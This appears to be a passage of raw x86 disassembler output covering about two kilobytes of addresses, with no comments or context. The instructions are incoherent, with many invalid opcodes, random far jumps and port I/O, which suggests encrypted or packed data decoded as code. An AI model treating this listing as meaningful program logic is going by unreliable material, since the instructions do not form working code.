  4134fe:	jg     0x413578
  413500:	push   0x7c
  413502:	js     0x41357c
  413504:	sub    bl,BYTE PTR [ecx+eiz*4-0x6e96c6ab]
  41350b:	pop    edx
  41350c:	fwait
  41350d:	in     eax,0xea
  41350f:	jl     0x41353c
  413511:	inc    ebx
  413512:	push   0x7901b974
  413517:	(bad)
  41351a:	push   edx
  41351b:	xlat   BYTE PTR ds:[ebx]
  41351c:	bound  edx,QWORD PTR [esi+ebp*2]
  41351f:	ja     0x41351d
  413521:	mov    di,0xfb0d
  413525:	mov    ds:0x100123af,eax
  41352a:	pop    edx
  41352b:	mov    ebp,0x71babc0b
  413530:	js     0x413594
  413532:	and    eax,0x16ba1d67
  413537:	push   0xa3488f7f
  41353c:	mov    ?,ebp
  41353e:	fcom   st(3)
  413540:	xor    BYTE PTR [edx+0x24740e26],ah
  413546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413547:	aam    0x3a
  413549:	pop    ds
  41354a:	lock adc al,0xcb
  41354d:	gs mov dl,0x79
  413550:	dec    eax
  413551:	or     dl,BYTE PTR [edx]
  413553:	inc    esp
  413554:	cdq    
  413555:	mov    ebp,0x59e29cef
  41355a:	cld    
  41355b:	jo     0x4134f2
  41355d:	mov    ebp,0xc14fc879
  413562:	loopne 0x413592
  413564:	jp     0x413531
  413566:	fcomp  DWORD PTR [edi+0x5ecc5258]
  41356d:	and    eax,DWORD PTR es:[edi+ebp*4+0x39]
  413572:	shr    ah,1
  413574:	jge    0x4135a4
  413576:	out    0x33,al
  413578:	loopne 0x4135d2
  41357a:	add    BYTE PTR [edx-0x3b58c355],bh
  413580:	fstp   TBYTE PTR [edi]
  413582:	adc    DWORD PTR [edx],esi
  413584:	pop    esp
  413585:	mov    gs,esi
  413587:	inc    ebp
  413588:	imul   edi,DWORD PTR [edx-0x6c],0xffffff90
  41358c:	push   ds
  41358d:	fdivrp st(6),st
  41358f:	dec    ebp
  413590:	retf   0x19
  413593:	fidiv  DWORD PTR [ebx+0x38]
  413596:	push   ss
  413597:	out    0xf5,eax
  413599:	cli    
  41359a:	sti    
  41359b:	pop    esi
  41359c:	adc    esp,DWORD PTR [eax*1-0x23342ed2]
  4135a3:	sbb    DWORD PTR [ecx-0x29],ebp
  4135a6:	js     0x41361b
  4135a8:	push   ss
  4135a9:	in     al,0x2e
  4135ab:	enter  0x3a58,0x9e
  4135af:	dec    edx
  4135b0:	mov    eax,ds:0xd5f8652a
  4135b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135b6:	mov    edx,0x917775bb
  4135bb:	sub    esp,DWORD PTR [esi+0x1eae7a09]
  4135c1:	scas   eax,DWORD PTR es:[edi]
  4135c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135c3:	aad    0xd6
  4135c5:	or     al,0xed
  4135c7:	and    ebx,esp
  4135c9:	gs data16 ja 0x41360c
  4135cd:	cli    
  4135ce:	stc    
  4135cf:	fstp   DWORD PTR [esi+ebx*4-0x40de4a46]
  4135d6:	xor    edx,DWORD PTR [ebx+eiz*8]
  4135d9:	jno    0x413579
  4135db:	sbb    ax,WORD PTR [edx-0x29]
  4135df:	push   ebp
  4135e0:	sub    DWORD PTR [edi+0xb2fc0ec],edi
  4135e6:	xlat   BYTE PTR ds:[ebx]
  4135e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135e8:	inc    edi
  4135e9:	icebp  
  4135ea:	hlt    
  4135eb:	test   al,0x66
  4135ed:	push   es
  4135ee:	push   ebx
  4135ef:	or     BYTE PTR [edx],al
  4135f1:	jae    0x41364a
  4135f3:	jmp    0x4135c1
  4135f5:	cmp    cl,BYTE PTR [ecx]
  4135f7:	loope  0x41357f
  4135f9:	add    DWORD PTR [edi-0x5c],esp
  4135fc:	outs   dx,DWORD PTR ds:[esi]
  4135fd:	cld    
  4135fe:	retf   0x2b4b
  413601:	cli    
  413602:	nop
  413603:	fsubp  st(5),st
  413605:	cwde   
  413606:	call   0x1597c14d
  41360b:	out    dx,al
  41360c:	std    
  41360d:	outs   dx,DWORD PTR ds:[esi]
  41360e:	in     al,0x5
  413610:	xor    esp,0x22
  413613:	push   0xee98987d
  413618:	push   edx
  413619:	pusha  
  41361a:	mov    al,0x5f
  41361c:	sbb    dh,BYTE PTR [ebx+eax*1-0x2a17e8c1]
  413623:	xchg   esp,eax
  413624:	loope  0x41367f
  413626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413627:	daa    
  413628:	add    ecx,DWORD PTR [esi+0xe488001]
  41362e:	into   
  41362f:	(bad)  
  413630:	pop    ecx
  413631:	cmp    esp,DWORD PTR [edi-0x80]
  413634:	gs pop ebx
  413636:	jmp    0x2f2e:0x7177d089
  41363d:	std    
  41363e:	nop
  41363f:	sti    
  413640:	sbb    BYTE PTR [ebx-0x78fb87d1],dh
  413646:	mov    esp,gs
  413648:	xchg   esi,eax
  413649:	cwde   
  41364a:	stc    
  41364b:	in     eax,0xb9
  41364d:	test   al,0x51
  41364f:	cli    
  413650:	pop    ds
  413651:	xor    BYTE PTR [ebx+0x879285e],bh
  413657:	aam    0xf3
  413659:	stos   DWORD PTR es:[edi],eax
  41365a:	add    BYTE PTR [bx+si-0x78],al
  41365e:	out    0x9a,al
  413660:	mov    DWORD PTR [eax+0x4ceb9324],edx
  413666:	mov    al,0xd3
  413668:	push   eax
  413669:	ja     0x41368a
  41366b:	lock jne 0x413628
  41366e:	mov    edi,0x92a59a7b
  413673:	in     eax,dx
  413674:	inc    esi
  413675:	push   edx
  413676:	add    al,0x58
  413678:	pop    ds
  413679:	jns    0x4136da
  41367b:	jbe    0x4136e6
  41367d:	sahf   
  41367e:	jp     0x4136cf
  413680:	into   
  413681:	imul   ecx,DWORD PTR [edx],0xa6bd1dd1
  413687:	icebp  
  413688:	push   0x5fd01f77
  41368d:	mov    ah,0xa1
  41368f:	add    eax,edi
  413691:	js     0x41365c
  413693:	clc    
  413694:	or     DWORD PTR [eax+0x644b9d1a],esp
  41369a:	pusha  
  41369b:	add    eax,0x32ae45ea
  4136a0:	nop
  4136a1:	sbb    BYTE PTR [ecx+edi*2+0x4e],bl
  4136a5:	mov    ebp,0x1a2344a3
  4136ab:	push   ebp
  4136ac:	xor    BYTE PTR [eax],bh
  4136ae:	jmp    0xb1f1:0xbe1466c4
  4136b5:	data16 shl al,1
  4136b8:	das    
  4136b9:	dec    esp
  4136ba:	mov    ds:0x3067ee17,eax
  4136bf:	test   al,0xaa
  4136c1:	aaa    
  4136c2:	test   al,0xd
  4136c4:	xchg   esp,ebx
  4136c6:	mov    esi,0x9fec0c28
  4136cb:	dec    esp
  4136cc:	inc    ebx
  4136cd:	or     al,0x0
  4136cf:	cmp    al,0x2c
  4136d1:	pop    edx
  4136d2:	mov    al,ds:0xe6deba14
  4136d7:	rcl    BYTE PTR [esi-0x241c2215],cl
  4136dd:	test   eax,0xe47a2d3
  4136e2:	jmp    0xe358e181
  4136e7:	mov    esi,0x658bef14
  4136ec:	and    DWORD PTR [ecx+0x69792463],ebp
  4136f2:	nop
  4136f3:	xor    bh,al
  4136f5:	es das 
  4136f7:	sbb    DWORD PTR [edx],eax
  4136f9:	jge    0x41373a
  4136fb:	fistp  QWORD PTR [eax+0x4e463e16]
  413701:	jns    0x41374d
  413703:	int    0x95
  413705:	aad    0x62
  413707:	mov    edi,0x61e0aa9d
  41370c:	lea    ecx,[edx]
  41370e:	ret    0x5dbc
  413711:	add    cl,bl
  413713:	dec    esp
  413714:	rol    DWORD PTR [eax-0x675deb79],1
  41371a:	lods   al,BYTE PTR ds:[esi]
  41371b:	jns    0x413793
  41371d:	jb     0x413770
  41371f:	test   edi,0x7d5d980f
  413725:	ror    DWORD PTR [esi+0x46],0x67
  413729:	jmp    0xcd97:0xb143d860
  413730:	daa    
  413731:	(bad)  
  413732:	lock or eax,0xdcdf0ef4
  413738:	xor    edi,esp
  41373a:	and    BYTE PTR [ebx-0x6559ddcb],ch
  413740:	mov    ds:0xfbeccd68,eax
  413745:	pop    edi
  413746:	in     eax,dx
  413747:	mov    cl,0x82
  413749:	sar    BYTE PTR [edx-0x5a227b56],0x8f
  413750:	js     0x4137b8
  413752:	sub    al,0x93
  413754:	fxtract 
  413756:	xor    DWORD PTR [eax+0x3c185e0a],esi
  41375c:	test   BYTE PTR [ebx-0x278cf87],0xe
  413763:	rol    DWORD PTR [esi-0x5c9119a1],1
  413769:	sbb    al,0xb2
  41376b:	sub    eax,0x7185708
  413770:	stos   DWORD PTR es:[edi],eax
  413771:	pop    esp
  413772:	lahf   
  413773:	fadd   st,st(4)
  413775:	mov    ch,0xea
  413777:	sub    DWORD PTR ds:0x669da712,ebx
  41377d:	rol    DWORD PTR [ebx],cl
  41377f:	lock gs cwde 
  413782:	and    DWORD PTR [edi],edx
  413784:	ja     0x413725
  413786:	aas    
  413787:	iret   
  413788:	aas    
  413789:	pop    eax
  41378a:	cmp    BYTE PTR [esp+eiz*2-0x4d],0xac
  41378f:	jecxz  0x41376f
  413791:	mov    dh,0x2
  413793:	xchg   edx,eax
  413794:	inc    edi
  413795:	imul   edx,DWORD PTR [eax-0xdb02e8],0xab3018c5
  41379f:	mov    ah,0xe0
  4137a1:	rcl    esp,0x34
  4137a4:	sbb    esi,DWORD PTR [edx+eiz*1]
  4137a7:	mov    eax,0x7b3734ca
  4137ac:	in     al,dx
  4137ad:	or     al,0x68
  4137af:	test   DWORD PTR [ebp+ebp*1-0x25],0xf5496b16
  4137b7:	pusha  
  4137b8:	jmp    DWORD PTR [ecx+0x15d7fd73]
  4137be:	xchg   edi,eax
  4137bf:	dec    ebx
  4137c0:	xchg   edi,eax
  4137c1:	lods   al,BYTE PTR ds:[esi]
  4137c2:	pop    eax
  4137c3:	jnp    0x413840
  4137c5:	int3   
  4137c6:	push   ecx
  4137c7:	push   eax
  4137c8:	(bad)  
  4137c9:	es aad 0x69
  4137cc:	ja     0x413785
  4137ce:	sbb    eax,0x81b6f95f
  4137d3:	js     0x4137bf
  4137d5:	ja     0x413766
  4137d7:	dec    eax
  4137d8:	ins    BYTE PTR es:[edi],dx
  4137d9:	mov    WORD PTR [ebp-0x46867566],fs
  4137df:	jbe    0x4137dd
  4137e1:	popa   
  4137e2:	or     ch,BYTE PTR [eax]
  4137e4:	jns    0x413814
  4137e6:	jp     0x41383f
  4137e8:	adc    BYTE PTR [ecx+edi*4],dl
  4137eb:	mov    ebp,0xe0142be
  4137f0:	clc    
  4137f1:	repnz (bad) 
  4137f4:	int3   
  4137f5:	dec    edx
  4137f6:	sub    eax,0x514624
  4137fb:	or     eax,0x2ac13645
  413800:	pop    ss
  413801:	pop    ecx
  413802:	jno    0x413790
  413804:	or     al,0x54
  413806:	jecxz  0x413797
  413808:	or     al,0xbb
  41380a:	aaa    
  41380b:	out    dx,al
  41380c:	dec    eax
  41380d:	push   eax
  41380e:	dec    ebx
  41380f:	jno    0x413826
  413811:	mov    dl,BYTE PTR [edi+0x72b7b86]
  413817:	mov    bl,ah
  413819:	stos   BYTE PTR es:[edi],al
  41381a:	shl    eax,cl
  41381c:	jg     0x41379e
  41381e:	aad    0xe6
  413820:	pop    ss
  413821:	fstp   DWORD PTR [ecx-0x2f481ef6]
  413827:	mov    ds:0xe9cc76b7,al
  41382c:	add    eax,0xb343145f
  413831:	leave  
  413832:	loope  0x4138a0
  413834:	cdq    
  413835:	imul   esp,DWORD PTR [edi],0x22520cc5
  41383b:	aad    0xc2
  41383d:	lds    ebx,FWORD PTR cs:[edx]
  413840:	jle    0x413840
  413842:	push   es
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	sub    esp,DWORD PTR [edx+0x62]
  413847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413848:	fwait
  413849:	enter  0x33d6,0x8c
  41384d:	nop
  41384e:	sub    ch,BYTE PTR [eax+0x48c1eff1]
  413854:	add    al,0xdc
  413856:	cmp    DWORD PTR [eax+ebp*1-0x29b9fb5d],0xffffffbc
  41385e:	mov    ds:0xd40600eb,al
  413863:	cli    
  413864:	jmp    0xb25febe4
  413869:	inc    ebx
  41386a:	pop    edx
  41386b:	adc    dl,bh
  41386d:	xchg   edi,eax
  41386e:	(bad)  
  41386f:	in     al,dx
  413870:	mov    ebp,0xe90e8009
  413875:	fwait
  413876:	inc    edi
  413877:	loope  0x4138bc
  413879:	pop    ss
  41387a:	mov    WORD PTR [ecx],?
  41387c:	xchg   BYTE PTR [esi+ecx*1-0x7c6e50b8],ah
  413883:	(bad)  
  413884:	fidiv  WORD PTR [ecx]
  413886:	les    ebp,FWORD PTR [ecx+eax*1-0x17fae13a]
  41388d:	inc    ebx
  41388e:	sbb    al,0x29
  413890:	and    al,0x52
  413892:	sub    bh,BYTE PTR [ecx-0x4932deee]
  413898:	push   ecx
  413899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41389a:	inc    esp
  41389b:	out    dx,al
  41389c:	dec    eax
  41389d:	mov    edi,0x748e2d63
  4138a2:	push   edi
  4138a3:	leave  
  4138a4:	(bad)  
  4138a5:	enter  0x970d,0x5b
  4138a9:	pop    ebx
  4138aa:	xchg   edx,eax
  4138ab:	call   0xad2e:0xf36832c1
  4138b2:	inc    ebx
  4138b3:	lods   eax,DWORD PTR ds:[esi]
  4138b4:	inc    ecx
  4138b5:	mov    ebp,0x5191bab
  4138ba:	mov    edx,0x6d172ad8
  4138bf:	jl     0x413921
  4138c1:	addr16 push 0xb5d44f5c
  4138c7:	adc    BYTE PTR [edx-0x6b],dl
  4138ca:	mov    DWORD PTR [eax],edi
  4138cc:	ins    DWORD PTR es:[edi],dx
  4138cd:	push   0xc7ad1590
  4138d2:	adc    DWORD PTR ds:0x3f786984,esp
  4138d8:	mov    ebx,0x691434bd
  4138dd:	push   cs
  4138de:	inc    ebp
  4138df:	test   BYTE PTR ds:0xaf589b37,dl
  4138e5:	shr    DWORD PTR [edx+0x1b3ba5fe],1
  4138eb:	add    DWORD PTR [ecx],0x4c4a40c7
  4138f1:	mov    ch,0xe1
  4138f3:	outs   dx,BYTE PTR ds:[esi]
  4138f4:	cmp    al,0xa9
  4138f6:	cmp    BYTE PTR [ecx],ah
  4138f8:	dec    eax
  4138f9:	iret   
  4138fa:	repz out dx,al
  4138fc:	or     al,0x18
  4138fe:	ss lock aad 0x9d
  413902:	fsubp  st(0),st
  413904:	les    ecx,FWORD PTR [edx-0x1]
  413907:	cmc    
  413908:	ret    0xbdfe
  41390b:	add    bl,cl
  41390d:	ds add dh,bh
  413910:	cmp    ebp,ebp
  413912:	or     al,0xad
  413914:	test   al,0x5c
  413916:	pop    edi
  413917:	cwde   
  413918:	dec    ecx
  413919:	mov    ch,0xb9
  41391b:	call   0x26c601f5
  413920:	call   0xf6f9b611
  413925:	push   cs
  413926:	mov    ds:0x3b30128,al
  41392b:	mov    dl,0x9b
  41392d:	add    al,0x86
  41392f:	push   0xffffffbe
  413931:	jne    0x4138c3
  413933:	idiv   BYTE PTR [ebp-0x1c]
  413936:	jnp    0x413972
  413938:	mov    edx,0xd4cb64d1
  41393d:	xchg   BYTE PTR [esi+0x48d470d1],dl
  413943:	(bad)  
  413944:	lahf   
  413945:	cmc    
  413946:	gs pop edi
  413948:	add    eax,0x7b08b75e
  41394d:	add    al,0xe4
  41394f:	and    BYTE PTR [ecx-0x2c0386c4],ah
  413955:	xor    al,0x27
  413957:	in     al,0x39
  413959:	(bad)  
  41395a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41395b:	dec    ecx
  41395c:	daa    
  41395d:	add    ecx,ecx
  41395f:	les    eax,FWORD PTR gs:[edi+ecx*8+0x54d28fb9]
  413967:	int    0x5
  413969:	loopne 0x4139cc
  41396b:	daa    
  41396c:	in     al,dx
  41396d:	mov    esi,0xf07d07ec
  413972:	das    
  413973:	mov    BYTE PTR [eax],dl
  413975:	ret    
  413976:	inc    edi
  413977:	cmp    al,0x62
  413979:	cmc    
  41397a:	rol    BYTE PTR ds:0x3529a612,0xa2
  413981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413982:	cmp    ebx,DWORD PTR [edx-0x5a9885ad]
  413988:	cmp    DWORD PTR [edx],esi
  41398a:	repnz inc eax
  41398c:	mov    dl,0x74
  41398e:	retf   0x3367
  413991:	(bad)  
  413992:	jae    0x41391b
  413994:	dec    ecx
  413995:	cmp    eax,DWORD PTR [ebx+0x7f618a68]
  41399b:	sub    eax,0xf7fb0626
  4139a0:	dec    esi
  4139a1:	call   0xda2b9594
  4139a6:	sti    
  4139a7:	pop    es
  4139a8:	dec    esp
  4139a9:	popa   
  4139aa:	add    DWORD PTR [esi-0x29ad731d],ecx
  4139b0:	mov    bl,0xf9
  4139b2:	inc    esi
  4139b3:	mov    al,ds:0xbaeb024b
  4139b8:	adc    bh,ah
  4139ba:	cmp    edx,DWORD PTR [esi]
  4139bc:	sbb    edi,DWORD PTR [ebx]
  4139be:	mov    bl,0x65
  4139c0:	lods   eax,DWORD PTR ds:[esi]
  4139c1:	out    dx,al
  4139c2:	jle    0x4139d2
  4139c4:	jne    0x413986
  4139c6:	jmp    0xb499dd2b
  4139cb:	jnp    0x41395c
  4139cd:	or     al,0xf5
  4139cf:	or     esi,eax
  4139d1:	xchg   ebx,eax
  4139d2:	shl    DWORD PTR [edx],cl
  4139d4:	mov    al,0x17
  4139d6:	mov    edx,0xc702674c
  4139db:	push   0xffffffff
  4139dd:	inc    esi
  4139de:	scas   al,BYTE PTR es:[edi]
  4139df:	mov    ecx,0xe7b0ee78
  4139e4:	test   DWORD PTR [edi+eiz*2],esi
  4139e7:	fwait
  4139e8:	js     0x4139d6
  4139ea:	sahf   
  4139eb:	and    ebx,eax
  4139ed:	fdiv   QWORD PTR [esi+ebp*8+0x58d6b0d]
  4139f4:	inc    esi
  4139f5:	imul   eax,DWORD PTR [edx+0x0],0x506e9
  4139fc:	add    BYTE PTR [edi],bh
  4139fe:	(bad)
  413a01:	(bad)  
  413a02:	aas    
  413a03:	(bad)
  413a06:	or     ecx,DWORD PTR [eax+0xc]
  413a09:	xor    eax,0x64c92bea
  413a0e:	sbb    edi,DWORD PTR [edi+0x78]
  413a11:	push   0x7c
  413a13:	js     0x413a8d
  413a15:	pop    ebp
  413a16:	add    DWORD PTR [ecx-0x3ae2cda6],0xd76c2ae6
  413a20:	std    
  413a21:	sti    
  413a22:	popa   
  413a23:	xor    eax,0xe525078b
  413a28:	fisub  WORD PTR [ecx+0x2fd11a1d]
  413a2e:	aas    
  413a2f:	pop    edi
  413a30:	cmp    eax,0xfa514a6f
  413a35:	adc    eax,0x8bb83f24
  413a3a:	repnz mov cl,0x4b
  413a3d:	jg     0x413a7a
  413a3f:	xchg   edx,eax
  413a40:	sar    DWORD PTR [edi+ecx*4+0x19d7fe35],cl
  413a47:	lods   al,BYTE PTR ds:[esi]
  413a48:	inc    esp
  413a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a4a:	scas   eax,DWORD PTR es:[edi]
  413a4b:	into   
  413a4c:	cwde   
  413a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a4e:	mov    gs,WORD PTR [eax]
  413a50:	cld    
  413a51:	push   ebx
  413a52:	and    ecx,DWORD PTR [esi-0x35]
  413a55:	add    BYTE PTR [edi+0x21092b42],0x9c
  413a5c:	not    eax
  413a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a5f:	jae    0x413a5e
  413a61:	les    eax,FWORD PTR [ebx]
  413a63:	sti    
  413a64:	es adc eax,0x3dd057f5
  413a6a:	mov    gs,WORD PTR [ebx-0x67]
  413a6d:	mov    edi,0x3c363f02
  413a72:	call   FWORD PTR [edx]
  413a74:	in     al,dx
  413a75:	(bad)  
  413a76:	pop    ecx
  413a77:	xor    al,BYTE PTR [esi+0x28]
  413a7a:	mov    al,ds:0x71e628fc
  413a7f:	push   0x68576036
  413a84:	mov    cs,WORD PTR [eax+0x5f]
  413a87:	push   esi
  413a88:	xchg   esp,eax
  413a89:	dec    edx
  413a8a:	fld    DWORD PTR [ebx-0x18236051]
  413a90:	mov    ?,WORD PTR cs:[eax+0x5b]
  413a94:	mov    dl,0x22
  413a96:	pop    ds
  413a97:	and    DWORD PTR [edx+0x8],0x42
  413a9b:	ja     0x413afb
  413a9d:	std    
  413a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a9f:	mov    al,ds:0xdf769f8d
  413aa4:	test   DWORD PTR [edi+edi*1],0x66d8312a
  413aab:	inc    eax
  413aac:	mov    al,ds:0x7ae38eaa
  413ab1:	fild   WORD PTR [ebp+0x3d7ed7a]
  413ab7:	out    dx,al
  413ab8:	cmp    ebp,0xffffffc0
  413abb:	mov    eax,ds:0xfa27e58
  413ac0:	test   eax,0xc12567a1
  413ac5:	(bad)  
  413ac6:	mul    DWORD PTR [ebx-0x14]
  413ac9:	inc    ebx
  413aca:	mov    edx,0x7a4ee098
  413acf:	lahf   
  413ad0:	mov    ch,BYTE PTR [esi+0x59]
  413ad3:	cdq    
  413ad4:	xchg   ebp,eax
  413ad5:	jbe    0x413ae6
  413ad7:	sub    al,0x1b
  413ad9:	inc    ebx
  413ada:	jmp    0xf6ea0ee9
  413adf:	xor    BYTE PTR [edi+0x78],ch
  413ae2:	mov    ah,0x4c
  413ae4:	call   0xec7e:0xa3ee5324
  413aeb:	lock in al,0xa5
  413aee:	stos   BYTE PTR es:[edi],al
  413aef:	dec    ebp
  413af0:	cli    
  413af1:	adc    al,0x5
  413af3:	cli    
  413af4:	inc    esi
  413af5:	and    al,0xff
  413af7:	adc    ecx,0x45
  413afa:	out    0x9e,al
  413afc:	push   ebp
  413afd:	lock sbb DWORD PTR [edi+0x72fbc84e],ebx
  413b04:	clc    
  413b05:	mov    ds:0x532ab439,eax
  413b0a:	jo     0x413ab2
  413b0c:	(bad)  
  413b0d:	lds    edx,FWORD PTR [esi-0x29]
  413b10:	ficomp DWORD PTR [edi-0x6f29ba8b]
  413b16:	bnd jp 0x413adb
  413b19:	mov    ah,0xe7
  413b1b:	imul   esp,DWORD PTR [ebp+0x7d70bbfe],0xffffffed
  413b22:	sbb    al,0x4a
  413b24:	(bad)  
  413b25:	pop    ds
  413b26:	mov    dl,0xa7
  413b28:	rol    DWORD PTR [edi+0x3e],1
  413b2b:	dec    eax
  413b2c:	mov    DWORD PTR [esi+0x7240c9ae],esi
  413b32:	les    esi,FWORD PTR [ebx+0x61e5ebe5]
  413b38:	jne    0x413b1a
  413b3a:	aas    
  413b3b:	loopne 0x413b45
  413b3d:	fidivr DWORD PTR [edi-0xc52f86b]
  413b43:	fisubr WORD PTR [esi+0x1e]
  413b46:	in     al,0xcb
  413b48:	(bad)  
  413b49:	jno    0x413b19
  413b4b:	sub    al,0x11
  413b4d:	mov    esp,0x2c4d436a
  413b52:	dec    esp
  413b53:	and    al,0x87
  413b55:	push   ecx
  413b56:	pop    edi
  413b57:	mov    eax,0xf6207bf5
  413b5c:	jbe    0x413b80
  413b5e:	(bad)  
  413b5f:	pop    ss
  413b60:	pushf  
  413b61:	lea    ebx,[edi+eiz*4+0x35bc7f52]
  413b68:	sbb    edi,DWORD PTR [ebp+eax*1-0xe]
  413b6c:	(bad)  [ebx-0xb]
  413b6f:	lahf   
  413b70:	mov    al,0xc8
  413b72:	retf   
  413b73:	iret   
  413b74:	mov    bl,ah
  413b76:	jg     0x413b43
  413b78:	dec    ebx
  413b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b7a:	je     0x413bf7
  413b7c:	test   al,0xe4
  413b7e:	aas    
  413b7f:	fidiv  WORD PTR [edi]
  413b81:	push   ds
  413b82:	xchg   esi,eax
  413b83:	adc    eax,0xef29fc7e
  413b88:	popa   
  413b89:	dec    ebp
  413b8a:	fistp  QWORD PTR [ebx+0x1a]
  413b8d:	shl    BYTE PTR [edx+0x2d],cl
  413b90:	cld    
  413b91:	in     al,dx
  413b92:	in     eax,dx
  413b93:	stos   DWORD PTR es:[edi],eax
  413b94:	push   0xffffffe1
  413b96:	and    bh,BYTE PTR [ebp-0x75a55dc5]
  413b9c:	xchg   ebx,eax
  413b9d:	adc    ch,BYTE PTR [edx-0x2c]
  413ba0:	and    eax,0x4299f015
  413ba5:	and    BYTE PTR [ebx+ebx*4+0x182ab280],cl
  413bac:	sbb    al,0xeb
  413bae:	pop    ebp
  413baf:	pop    esp
  413bb0:	xchg   ecx,eax
  413bb1:	mov    bl,0x6
  413bb3:	scas   eax,DWORD PTR es:[edi]
  413bb4:	sub    bl,BYTE PTR [ecx+eax*1-0x54]
  413bb8:	inc    esi
  413bb9:	pop    esp
  413bba:	xor    edx,esi
  413bbc:	xor    cl,BYTE PTR [ebp+0x63]
  413bbf:	aam    0xc8
  413bc1:	stos   DWORD PTR es:[edi],eax
  413bc2:	mov    al,ds:0xa3dc3d61
  413bc7:	sbb    DWORD PTR [eax],0x8d800d48
  413bcd:	mov    ecx,0xe7883aa2
  413bd2:	mov    edi,0xb9aee8c3
  413bd7:	ret    
  413bd8:	and    edi,ebx
  413bda:	pop    ds
  413bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bdc:	(bad)  
  413bdd:	inc    di
  413bdf:	cmc    
  413be0:	or     bl,BYTE PTR [esi-0x77]
  413be3:	mov    ch,0xdf
  413be5:	jmp    FWORD PTR [edi]
  413be7:	push   0xffffff93
  413be9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bea:	pop    ds
  413beb:	test   DWORD PTR [ebp+0x47],ebx
  413bee:	pop    ebx
  413bef:	adc    al,0x45
  413bf1:	(bad)  
  413bf2:	mov    dl,bl
  413bf4:	xchg   edi,eax
  413bf5:	ins    BYTE PTR es:[edi],dx
  413bf6:	jecxz  0x413b82
  413bf8:	inc    edi
  413bf9:	out    0x95,al
  413bfb:	xlat   BYTE PTR ds:[ebx]
  413bfc:	sahf   
  413bfd:	sahf   
  413bfe:	sbb    DWORD PTR [edx+0x7f],edx
  413c01:	pop    edi
  413c02:	xor    BYTE PTR [esi],dh
  413c04:	add    bh,BYTE PTR [eax]
  413c06:	sub    edi,edi
  413c08:	repnz (bad) 
  413c0a:	mov    esi,0x4aeb3ed3
  413c0f:	mov    cl,0xae
  413c11:	into   
  413c12:	mov    cs,WORD PTR [edx+0x3f]
  413c15:	mov    al,ds:0xc314bb1
  413c1a:	jle    0x413bf7
  413c1c:	mov    edi,0x4232760e
  413c21:	aas    
  413c22:	mov    esi,0xb3ddcfeb
  413c27:	popa   
  413c28:	push   ebx
  413c29:	inc    ebx
  413c2a:	fisttp WORD PTR [ebp+0x2a]
  413c2d:	mov    al,0x82
  413c2f:	mov    ecx,0xa49e2f54
  413c34:	sbb    al,0x1e
  413c36:	mov    cs,esp
  413c38:	dec    esi
  413c39:	imul   ebx,edi,0x5b
  413c3c:	jae    0x413c19
  413c3e:	push   0xb28e9bde
  413c43:	in     al,0x4
  413c45:	retf   0xdd9c
  413c48:	ja     0x413bf8
  413c4a:	push   cs
  413c4b:	mov    bh,0x16
  413c4d:	cmp    BYTE PTR [esp+eiz*8-0x2108a420],dl
  413c54:	ds xchg ebp,eax
  413c56:	mov    ch,0x81
  413c58:	scas   al,BYTE PTR es:[edi]
  413c59:	sub    ebp,ebx
  413c5b:	inc    ebx
  413c5c:	fst    DWORD PTR [edi-0x59165a84]
  413c62:	or     al,0xe7
  413c64:	fwait
  413c65:	adc    esi,DWORD PTR [edx+0x1b]
  413c68:	cmp    ebp,eax
  413c6a:	lock xchg ecx,eax
  413c6c:	je     0x413cc1
  413c6e:	sti    
  413c6f:	xor    BYTE PTR [edi],bl
  413c71:	add    DWORD PTR [ebp+0x48266482],edx
  413c77:	es add eax,0xe124a700
  413c7d:	push   cs
  413c7e:	add    DWORD PTR [ecx-0x22],ecx
  413c81:	ror    DWORD PTR [ecx+ebp*4],0xbc
  413c85:	xchg   ebp,eax
  413c86:	popa   
  413c87:	div    DWORD PTR [eax+0x42]
  413c8a:	xor    eax,0x89536ac0
  413c8f:	out    0xc7,al
  413c91:	xor    eax,0x21628c05
  413c96:	lock add dh,bl
  413c99:	mov    al,ds:0x3e6dfdb6
  413c9e:	push   ebp
  413c9f:	adc    ch,BYTE PTR [esi+edi*8-0x13]
  413ca3:	adc    BYTE PTR [ebp-0x68],ch
  413ca6:	xor    BYTE PTR [ecx-0x52],dl
  413ca9:	std    
  413caa:	ins    DWORD PTR es:[edi],dx
  413cab:	sahf   
  413cac:	mov    ebx,0xa926b397
  413cb1:	xor    dl,dh
  413cb3:	sbb    dh,bh
  413cb5:	es mov eax,0x3b62653e
  413cbb:	dec    ecx
  413cbc:	inc    edi
  413cbd:	push   ds
  413cbe:	push   cs
  413cbf:	cmp    DWORD PTR [ebx-0x7b1fb500],0x56fbeb40
  413cc9:	or     BYTE PTR [edi+esi*1-0x22],cl
  413ccd:	push   ebx
  413cce:	push   esp
  413ccf:	es push cs
  413cd1:	out    dx,eax
  413cd2:	inc    eax
  413cd3:	test   al,0xcb
  413cd5:	cwde   
  413cd6:	mov    ds:0x9d087a8a,eax
  413cdb:	sbb    eax,0x974753c1
  413ce0:	ins    DWORD PTR es:[edi],dx
  413ce1:	push   cs
  413ce2:	dec    ebx
  413ce3:	ja     0x413d1f
  413ce5:	popa   
  413ce6:	mul    DWORD PTR [edx]
  413ce8:	xor    BYTE PTR [ebx],0x22
  413ceb:	cli    
  413cec:	lahf   
  413ced:	outs   dx,DWORD PTR ds:[esi]
  413cee:	sbb    ebx,DWORD PTR [eax-0x6c]
  413cf1:	push   esi
  413cf2:	imul   bh
  413cf4:	push   esp
